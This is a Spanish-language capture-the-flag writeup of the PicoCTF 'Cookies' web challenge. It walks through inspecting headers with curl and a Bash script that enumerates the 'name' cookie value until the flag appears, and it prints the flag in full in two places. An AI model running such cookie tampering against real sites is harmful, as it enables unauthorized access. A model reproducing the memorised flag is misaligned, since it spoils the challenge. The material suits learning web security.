# Writeup: Cookies
**Categoría:** Easy
**Fecha de conversión:** 2026-04-24

---

Writeup – Reto “Cookies” (PicoCTF)


Categoría: Web Exploitation

Autor: madStacks

Descripción: Who doesn't love cookies? Try to figure out the best one.

1. Introducción

Se nos proporciona una URL:

http://wily-courier.picoctf.net:59309/

El reto consiste en manipular las cookies del navegador para obtener la bandera. El título y la descripción nos indican que la solución está relacionada con las cookies, y no hay más pistas.

2. Reconocimiento inicial

Al acceder con el navegador vemos una página simple que habla de galletas (cookies). Para entender qué sucede en el servidor, usamos curl con la opción -v (verbose) para ver los encabezados:

bash


curl -v http://wily-courier.picoctf.net:59309/


Respuesta relevante:

text


## < http/1.1 302 found

< Set-**Cookie**: name=-1; Path=/

< Location: /


Observamos que el servidor asigna una cookie llamada name con valor -1 y luego redirige a /. Es decir, la aplicación espera que el cliente envíe esa cookie para obtener el contenido real. Si no se envía, la redirige y la establece.


Para que curl siga la redirección y muestre el contenido final, utilizamos -L:

bash


curl -L http://wily-courier.picoctf.net:59309/


Esto devuelve una página HTML con un título “Cookies” y un mensaje que varía según el valor de la cookie.

3. Análisis de la cookie

Dado que el servidor establece la cookie name=-1, deducimos que el nombre de la cookie es name (no cookie como podríamos haber supuesto inicialmente). Además, el valor numérico probablemente actúa como un índice para mostrar distintos contenidos. La bandera estará oculta en uno de esos contenidos.


Probamos manualmente con diferentes valores para ver si el contenido cambia:

bash


curl -L -H "**Cookie**: name=0" http://wily-courier.picoctf.net:59309/

curl -L -H "**Cookie**: name=1" http://wily-courier.picoctf.net:59309/


Observamos que el contenido varía, pero no encontramos la flag de inmediato. Necesitamos probar un rango más amplio.

4. Automatización con script

Para no probar uno por uno manualmente, creamos un script en Bash que itere sobre un rango de valores y busque la bandera.


Archivo script.sh (versión final):

bash


```bash
#!/bin/bash
```

```bash
# URL del reto (puerto actual)
```

URL="http://wily-courier.picoctf.net:59309/"


echo "Probando valores de cookie 'name' desde -1 hasta 30..."

for i in {-1..30}; do

```
    echo -n "name=$i: "
    RESPONSE=$(curl -s -L -H "Cookie: name=$i" "$URL")
    if echo "$RESPONSE" | grep -q "picoCTF{"; then
        echo "¡BANDERA ENCONTRADA!"
        echo "$RESPONSE" | grep -o "picoCTF{[^}]*}"
        break
    else
        # Muestra primeros 100 caracteres para ver cambios
        echo "${RESPONSE:0:100}..."
    fi
```

done


### Explicación:


```
    -s (silent) evita salida de progreso.

    -L sigue la redirección automáticamente.

    -H "Cookie: name=$i" envía la cookie con el valor actual.

    grep -q busca la cadena picoCTF{ sin mostrar resultados.

    Si la encuentra, muestra la flag y termina.

    Si no, muestra los primeros 100 caracteres de la respuesta (para apreciar diferencias, aunque en este caso todas empezaban igual).

```

5. Ejecución y obtención de la bandera

Ejecutamos el script:

bash


chmod +x script.sh

./script.sh


Salida:

text


Probando valores de cookie 'name' desde -1 hasta 30...

name=-1: <!DOCTYPE html>...

name=0: <!DOCTYPE html>...

...

name=17: <!DOCTYPE html>...

name=18: ¡BANDERA ENCONTRADA!

picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}


El valor 18 produjo la bandera.

6. Comprobación final

Podemos verificar con un solo curl:

bash


curl -L -H "**Cookie**: name=18" http://wily-courier.picoctf.net:59309/ | grep picoCTF


Salida:

text


picoCTF{3v3ry1_l0v3s_c00k135_a4dadb49}


7. Explicación de por qué probamos diferentes valores

El servidor asigna una cookie inicial (name=-1) y luego, basándose en el valor de esa cookie, genera diferentes contenidos. No sabemos de antemano qué valor muestra la bandera, así que debemos probar varios hasta encontrarlo.


```
    ¿Por qué empezamos desde -1? Porque el servidor asigna -1 por defecto, y podría ser que la flag estuviera en un valor negativo (aunque en este caso no).

    ¿Por qué hasta 30? Por experiencia en retos similares, el rango suele ser pequeño (por ejemplo, del 0 al 20). Si no apareciera, ampliaríamos el rango.

    ¿Por qué no da error con otros valores? El servidor no rechaza valores inválidos; simplemente muestra páginas diferentes (a veces con el mismo aspecto visual). Por eso es necesario automatizar la búsqueda.

```

En esencia, la cookie actúa como un índice en un diccionario de contenidos, y nuestro objetivo es encontrar el índice que devuelve la bandera.

8. Lecciones aprendidas

```
    Inspección de encabezados: curl -v permite ver cómo el servidor maneja las cookies y redirecciones.

    Seguir redirecciones: Usar -L para obtener el contenido final.

    Automatización: Un pequeño script evita probar manualmente decenas de valores.

    Observación: El nombre de la cookie puede no ser obvio; hay que extraerlo de la respuesta del servidor.

```

9. Flag
text


picoCTF{***************}

